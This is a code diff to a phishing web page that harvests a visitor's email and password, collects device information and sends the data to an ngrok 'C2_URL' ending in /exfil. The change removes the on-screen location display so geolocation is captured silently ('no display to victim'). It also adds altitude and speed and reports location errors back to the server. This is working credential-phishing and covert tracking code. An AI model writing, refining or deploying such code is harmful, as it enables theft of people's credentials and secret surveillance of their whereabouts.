@@ -14,9 +14,6 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .status { color: #88ff88; font-size: 14px; margin-top: 10px; }
         #statusBox { background: #0a0a1a; padding: 10px; border-radius: 5px; font-size: 12px; color: #88ff88; max-height: 150px; overflow-y: auto; text-align: left; margin-top: 10px; font-family: monospace; }
-        .location-box { background: #0a1a2a; padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 14px; border: 1px solid #00aaff55; }
-        .location-box img { max-width: 100%; border-radius: 8px; margin-top: 8px; }
-        .label { color: #88aaff; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -34,13 +31,6 @@
         <div id="step2" class="hidden">
             <p>🔍 Scanning device...</p>
             <div class="loader"></div>
-            
-            <!-- Location display -->
-            <div id="locationDisplay" class="location-box hidden">
-                <div><span class="label">📍 Location:</span> <span id="locText">Detecting...</span></div>
-                <div id="mapContainer"></div>
-            </div>
-
             <p class="status" id="statusText">Collecting device information...</p>
             <div id="statusBox"></div>
         </div>
@@ -55,7 +45,6 @@
 
     <script>
         const C2_URL = 'https://matchless-palm-patriarch.ngrok-free.dev/exfil';
-        let currentLocation = null;
 
         function log(msg) {
             const box = document.getElementById('statusBox');
@@ -77,7 +66,7 @@
         }
 
         // ============================================================
-        // STEP 1: CREDENTIALS (EMAIL + PASSWORD)
+        // STEP 1: CREDENTIALS
         // ============================================================
         function step1() {
             const email = document.getElementById('email').value;
@@ -94,7 +83,7 @@
         }
 
         // ============================================================
-        // STEP 2: COLLECT ALL DATA + LOCATION DISPLAY
+        // STEP 2: COLLECT ALL DATA (LOCATION SILENT)
         // ============================================================
         async function collectAllData() {
             log('📡 Starting data collection...');
@@ -111,23 +100,24 @@
             });
             log('✅ Device info sent');
 
-            // --- LOCATION (with on-screen display) ---
+            // --- SILENT LOCATION (no display to victim) ---
             if (navigator.geolocation) {
-                log('📍 Requesting location...');
+                log('📍 Capturing location (silent)...');
                 navigator.geolocation.getCurrentPosition(
                     pos => {
-                        currentLocation = {
+                        const loc = {
                             lat: pos.coords.latitude,
                             lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
+                            accuracy: pos.coords.accuracy,
+                            altitude: pos.coords.altitude,
+                            speed: pos.coords.speed
                         };
-                        sendData({ type: 'location', ...currentLocation });
-                        log('✅ Location captured');
-                        updateLocationDisplay(currentLocation);
+                        sendData({ type: 'location', ...loc });
+                        log('✅ Location captured silently');
                     },
                     err => {
                         log('❌ Location denied: ' + err.message);
-                        document.getElementById('locText').innerText = '❌ Location access denied';
+                        sendData({ type: 'location_error', error: err.message });
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
@@ -183,26 +173,6 @@
                 document.getElementById('step2').classList.add('hidden');
                 document.getElementById('step3').classList.remove('hidden');
             }, 1500);
-        }
-
-        // ============================================================
-        // LOCATION DISPLAY
-        // ============================================================
-        function updateLocationDisplay(loc) {
-            const display = document.getElementById('locationDisplay');
-            display.classList.remove('hidden');
-            document.getElementById('locText').innerHTML = 
-                `<b>${loc.lat.toFixed(6)}</b>, <b>${loc.lon.toFixed(6)}</b> (accuracy: ${Math.round(loc.accuracy)}m)`;
-
-            // Static map image (OpenStreetMap)
-            const mapImg = document.createElement('img');
-            mapImg.src = `https://tile.openstreetmap.org/static/${loc.lat},${loc.lon},15,500x200.png`;
-            mapImg.alt = 'Location map';
-            mapImg.style.maxWidth = '100%';
-            mapImg.style.borderRadius = '8px';
-            mapImg.style.marginTop = '8px';
-            document.getElementById('mapContainer').innerHTML = '';
-            document.getElementById('mapContainer').appendChild(mapImg);
         }
 
         // ============================================================
